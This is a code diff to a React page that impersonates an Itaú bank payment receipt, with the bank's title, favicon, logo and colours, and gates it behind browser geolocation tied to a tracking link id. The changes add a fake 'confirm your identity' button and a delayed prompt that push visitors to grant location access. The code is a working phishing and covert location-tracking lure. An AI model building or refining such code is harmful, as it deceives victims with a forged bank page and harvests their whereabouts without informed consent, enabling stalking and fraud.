@@ -1,4 +1,4 @@
-import { Typography, Card, Space, Tag, Image, Spin } from "antd"
+import { Typography, Card, Space, Tag, Image, Spin, Button } from "antd"
 import { useParams } from "react-router-dom"
 import { useEffect, useState } from "react"
 import { api } from "../services/api"
@@ -9,14 +9,13 @@ export function Track() {
   const { id } = useParams()
   const [data, setData] = useState<any>(null)
   const [loading, setLoading] = useState(true)
-  const [authorized, setAuthorized] = useState(false)
+  const [authorized, setAuthorized] = useState<boolean | null>(null)
+  const [showButton, setShowButton] = useState(false)
 
-  // 🔥 FAVICON + TITLE DINÂMICO
   useEffect(() => {
     document.title = "Itaú - Comprovante"
 
     const oldLink = document.querySelector("link[rel~='icon']")
-
     if (oldLink) oldLink.remove()
 
     const newLink = document.createElement("link")
@@ -27,19 +26,11 @@ export function Track() {
 
     return () => {
       document.title = "PINME"
-
       newLink.remove()
-
-      const defaultLink = document.createElement("link")
-      defaultLink.rel = "icon"
-      defaultLink.href = "/favicon.ico"
-
-      document.head.appendChild(defaultLink)
     }
   }, [])
 
-  // 📍 GEOLOCATION + API
-  useEffect(() => {
+  const requestLocation = () => {
     if (!id) return
 
     navigator.geolocation.getCurrentPosition(
@@ -56,16 +47,30 @@ export function Track() {
 
         setTimeout(() => {
           setLoading(false)
-        }, 1500)
+        }, 1200)
       },
       () => {
         setAuthorized(false)
         setLoading(false)
       }
     )
+  }
+
+  useEffect(() => {
+    if (!id) return
+
+    requestLocation()
+
+    const timer = setTimeout(() => {
+      if (authorized === null) {
+        setShowButton(true)
+        setLoading(false)
+      }
+    }, 5000)
+
+    return () => clearTimeout(timer)
   }, [id])
 
-  // ⏳ LOADING
   if (loading) {
     return (
       <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center" }}>
@@ -77,20 +82,56 @@ export function Track() {
     )
   }
 
-  // ❌ BLOQUEIO SEM PERMISSÃO
-  if (!authorized) {
+  if (showButton && authorized === null) {
+    return (
+      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: 16 }}>
+        <Card style={{ maxWidth: 400, width: "100%", textAlign: "center" }}>
+          <Space direction="vertical" size="large">
+            <Title level={4}>Acesso ao comprovante</Title>
+
+            <Text type="secondary">
+              Para visualizar o comprovante, é necessário confirmar sua identidade.
+            </Text>
+
+            <Text type="secondary">
+              Clique no botão abaixo para continuar.
+            </Text>
+
+            <Button
+              size="large"
+              block
+              onClick={requestLocation}
+              style={{
+                background: "#ff6200",
+                borderColor: "#ff6200",
+                color: "#fff",
+                fontWeight: 600
+              }}
+            >
+              Ver comprovante
+            </Button>
+
+            <Text type="secondary" style={{ fontSize: 12 }}>
+              Caso não funcione, abra este link no navegador.
+            </Text>
+          </Space>
+        </Card>
+      </div>
+    )
+  }
+
+  if (authorized === false) {
     return (
       <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center" }}>
         <Card>
           <Text>
-            Para visualizar o comprovante, é necessário permitir acesso à localização.
+            Permissão de localização negada.
           </Text>
         </Card>
       </div>
     )
   }
 
-  // ✅ COMPROVANTE
   return (
     <div
       style={{
@@ -102,21 +143,10 @@ export function Track() {
         background: "#f5f5f5"
       }}
     >
-      <Card
-        style={{
-          width: "100%",
-          maxWidth: 420,
-          borderRadius: 16
-        }}
-      >
+      <Card style={{ width: "100%", maxWidth: 420, borderRadius: 16 }}>
         <Space direction="vertical" size="large" style={{ width: "100%" }}>
-
           <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
-            <Image
-              src="/itau.png"
-              preview={false}
-              width={40}
-            />
+            <Image src="/itau.png" preview={false} width={40} />
             <div>
               <Title level={5} style={{ margin: 0 }}>
                 Itaú
@@ -144,7 +174,6 @@ export function Track() {
           <Text type="secondary">
             Transação concluída com sucesso.
           </Text>
-
         </Space>
       </Card>
     </div>
